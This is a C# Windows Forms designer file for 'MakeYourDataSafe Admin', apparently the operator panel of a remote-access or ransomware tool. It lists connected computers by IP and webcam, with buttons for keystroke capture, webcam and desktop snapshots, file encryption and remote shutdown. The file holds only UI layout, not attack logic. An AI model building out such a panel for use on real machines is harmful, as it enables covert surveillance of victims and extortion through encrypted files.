namespace MakeYourDataSafe_Admin
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
            this.Computers = new System.Windows.Forms.DataGridView();
            this.ID = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.ip = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.name = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.webcam = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.keys = new System.Windows.Forms.Button();
            this.msg = new System.Windows.Forms.Button();
            this.web = new System.Windows.Forms.Button();
            this.snapshot = new System.Windows.Forms.Button();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.encrypt = new System.Windows.Forms.Button();
            this.shutdown = new System.Windows.Forms.Button();
            this.restart = new System.Windows.Forms.Button();
            ((System.ComponentModel.ISupportInitialize)(this.Computers)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // Computers
            // 
            this.Computers.AllowUserToAddRows = false;
            this.Computers.AllowUserToDeleteRows = false;
            this.Computers.AllowUserToResizeColumns = false;
            this.Computers.AllowUserToResizeRows = false;
            this.Computers.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.Computers.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.ID,
            this.ip,
            this.name,
            this.webcam});
            this.Computers.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.Computers.Location = new System.Drawing.Point(0, 6);
            this.Computers.MultiSelect = false;
            this.Computers.Name = "Computers";
            this.Computers.ReadOnly = true;
            this.Computers.RowHeadersVisible = false;
            this.Computers.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.Computers.Size = new System.Drawing.Size(401, 399);
            this.Computers.StandardTab = true;
            this.Computers.TabIndex = 1;
            this.Computers.SelectionChanged += new System.EventHandler(this.rowChange);
            // 
            // ID
            // 
            this.ID.HeaderText = "ID";
            this.ID.Name = "ID";
            this.ID.ReadOnly = true;
            // 
            // ip
            // 
            this.ip.HeaderText = "IP Address";
            this.ip.Name = "ip";
            this.ip.ReadOnly = true;
            this.ip.Resizable = System.Windows.Forms.DataGridViewTriState.True;
            this.ip.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
            // 
            // name
            // 
            this.name.HeaderText = "PC Name";
            this.name.Name = "name";
            this.name.ReadOnly = true;
            this.name.Resizable = System.Windows.Forms.DataGridViewTriState.True;
            this.name.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
            // 
            // webcam
            // 
            this.webcam.HeaderText = "Webcam";
            this.webcam.Name = "webcam";
            this.webcam.ReadOnly = true;
            // 
            // keys
            // 
            this.keys.Location = new System.Drawing.Point(407, 6);
            this.keys.Name = "keys";
            this.keys.Size = new System.Drawing.Size(121, 36);
            this.keys.TabIndex = 2;
            this.keys.Text = "Keystrokes";
            this.keys.UseVisualStyleBackColor = true;
            this.keys.Click += new System.EventHandler(this.keys_Click);
            // 
            // msg
            // 
            this.msg.Location = new System.Drawing.Point(407, 48);
            this.msg.Name = "msg";
            this.msg.Size = new System.Drawing.Size(121, 36);
            this.msg.TabIndex = 3;
            this.msg.Text = "Send Message";
            this.msg.UseVisualStyleBackColor = true;
            this.msg.Click += new System.EventHandler(this.msg_Click);
            // 
            // web
            // 
            this.web.Location = new System.Drawing.Point(407, 90);
            this.web.Name = "web";
            this.web.Size = new System.Drawing.Size(121, 36);
            this.web.TabIndex = 4;
            this.web.Text = "Take Webcam Pic";
            this.web.UseVisualStyleBackColor = true;
            this.web.Click += new System.EventHandler(this.web_Click);
            // 
            // snapshot
            // 
            this.snapshot.Location = new System.Drawing.Point(407, 132);
            this.snapshot.Name = "snapshot";
            this.snapshot.Size = new System.Drawing.Size(121, 36);
            this.snapshot.TabIndex = 5;
            this.snapshot.Text = "Take Desktop Pic";
            this.snapshot.UseVisualStyleBackColor = true;
            this.snapshot.Click += new System.EventHandler(this.snapshot_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(407, 300);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(121, 105);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 6;
            this.pictureBox1.TabStop = false;
            // 
            // encrypt
            // 
            this.encrypt.Location = new System.Drawing.Point(407, 174);
            this.encrypt.Name = "encrypt";
            this.encrypt.Size = new System.Drawing.Size(121, 36);
            this.encrypt.TabIndex = 7;
            this.encrypt.Text = "Encrypt files";
            this.encrypt.UseVisualStyleBackColor = true;
            this.encrypt.Click += new System.EventHandler(this.encrypt_Click);
            // 
            // shutdown
            // 
            this.shutdown.Location = new System.Drawing.Point(407, 216);
            this.shutdown.Name = "shutdown";
            this.shutdown.Size = new System.Drawing.Size(121, 36);
            this.shutdown.TabIndex = 8;
            this.shutdown.Text = "Shutdown";
            this.shutdown.UseVisualStyleBackColor = true;
            this.shutdown.Click += new System.EventHandler(this.shutdown_Click);
            // 
            // restart
            // 
            this.restart.Location = new System.Drawing.Point(407, 258);
            this.restart.Name = "restart";
            this.restart.Size = new System.Drawing.Size(121, 36);
            this.restart.TabIndex = 9;
            this.restart.Text = "Restart";
            this.restart.UseVisualStyleBackColor = true;
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(540, 422);
            this.Controls.Add(this.restart);
            this.Controls.Add(this.shutdown);
            this.Controls.Add(this.encrypt);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.snapshot);
            this.Controls.Add(this.web);
            this.Controls.Add(this.msg);
            this.Controls.Add(this.keys);
            this.Controls.Add(this.Computers);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Main";
            this.ShowIcon = false;
            this.Text = "MakeYourDataSafe Admin";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.Computers)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        private void Computers_SelectionChanged(object sender, System.EventArgs e)
        {
            throw new System.NotImplementedException();
        }

        #endregion
        private System.Windows.Forms.DataGridView Computers;
        private System.Windows.Forms.Button keys;
        private System.Windows.Forms.Button msg;
        private System.Windows.Forms.Button web;
        private System.Windows.Forms.Button snapshot;
        private System.Windows.Forms.DataGridViewTextBoxColumn ID;
        private System.Windows.Forms.DataGridViewTextBoxColumn ip;
        private System.Windows.Forms.DataGridViewTextBoxColumn name;
        private System.Windows.Forms.DataGridViewTextBoxColumn webcam;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Button encrypt;
        private System.Windows.Forms.Button shutdown;
        private System.Windows.Forms.Button restart;
    }
}

